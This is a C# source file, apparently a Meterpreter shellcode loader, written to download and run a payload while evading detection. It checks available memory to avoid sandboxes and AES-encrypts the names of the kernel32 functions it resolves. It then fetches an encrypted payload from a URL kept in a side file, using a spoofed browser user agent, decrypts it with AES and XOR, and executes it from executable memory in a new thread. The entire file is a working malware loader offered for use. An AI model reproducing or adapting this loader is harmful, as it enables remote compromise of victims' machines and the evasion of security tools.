using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace TCPMeterpreterProcess
{
    class Program
    {
        internal static class Unsafe
        {
            [DllImport("Kernel32")]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
            [DllImport("Kernel32")]
            internal static extern IntPtr LoadLibrary(string moduleName);
            internal delegate UInt32 Virtual_Alloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect);
        }
        internal delegate UInt32 Virtual_Alloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect);
        internal delegate IntPtr Create_Thread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId);
        internal delegate UInt32 Wait_ForSingle_Object(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
        static void Main(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
            if (ramCounter.NextValue() >= 4096)
            {
                byte[] shellcode = GetShellCode();
                string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
                string k = "AyD9Y9zW9dtvfqJzJb33gA==";
                string v = "YlnmzpP5550nqLxW+3wdNQ==";
                string c = "AkJecKOgemBiLxROAtA9WA==";
                string w = "cH9ouyrpylq2wwZqDlf5Uod4zw5Vx+OrGTO0iMg4ah8=";
                
                IntPtr trva = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(v, key));
                Virtual_Alloc va = (Virtual_Alloc)Marshal.GetDelegateForFunctionPointer(trva, typeof(Virtual_Alloc));
                IntPtr trct = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(c, key));
                IntPtr trwf = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(w, key));
                Create_Thread ct = (Create_Thread)Marshal.GetDelegateForFunctionPointer(trct, typeof(Create_Thread));
                Wait_ForSingle_Object wfoi = (Wait_ForSingle_Object)Marshal.GetDelegateForFunctionPointer(trwf, typeof(Wait_ForSingle_Object));

                UInt32 mem = va(0, (UInt32)shellcode.Length, 0x1000, 0x40);
                Marshal.Copy(shellcode, 0, (IntPtr)(mem), shellcode.Length);
                UInt32 threadId = 0;
                IntPtr hThread = ct(0, 0, mem, IntPtr.Zero, 0, ref threadId);
                wfoi(hThread, 0xFFFFFFFF);
            }

        }
        private static char[] Xoe_Decrypt(char[] data)
        {
            char[] key = "qwertyuiopasdfghjklzxcvbnm".ToArray();
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key[i % key.Length];
            }

            return data;
        }

        private static string AesDecrypt(string str, string key)
        {
            if (string.IsNullOrEmpty(str)) return null;
            Byte[] toEncryptArray = Convert.FromBase64String(str);

            RijndaelManaged rm = new RijndaelManaged
            {
                Key = Encoding.UTF8.GetBytes(key),
                Mode = CipherMode.ECB,
                Padding = PaddingMode.PKCS7
            };

            ICryptoTransform cTransform = rm.CreateDecryptor();
            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);

            return Encoding.UTF8.GetString(resultArray);
        }
        private static byte[] GetShellCode()
        {
            string path = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
            string webpath = File.ReadAllText(path + "webpath.txt", Encoding.UTF8);
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(new Uri(webpath));
            req.Method = "GET";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
            HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            Stream stms = res.GetResponseStream();
            StreamReader reader = new StreamReader(stms, Encoding.UTF8);
            string result = reader.ReadToEnd();
            reader.Close();
            req.Abort();

            result = AesDecrypt(result, "BsijVUv2v+Ql/NM3pQv8uQ==");
            char[] c_result = result.ToCharArray();
            result = new string(Xoe_Decrypt(c_result));

            byte[] shellcode = HexStringToBytes(result);

            return shellcode;
        }
        public static byte[] HexStringToBytes(string hexString)
        {
            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",","");
            if (hexString.Length % 2 != 0)
                throw new ArgumentException();
            return Enumerable.Range(0, hexString.Length / 2)
                    .Select(i => Convert.ToByte(hexString.Substring(i * 2, 2), 16))
                    .ToArray();
        }
    }
}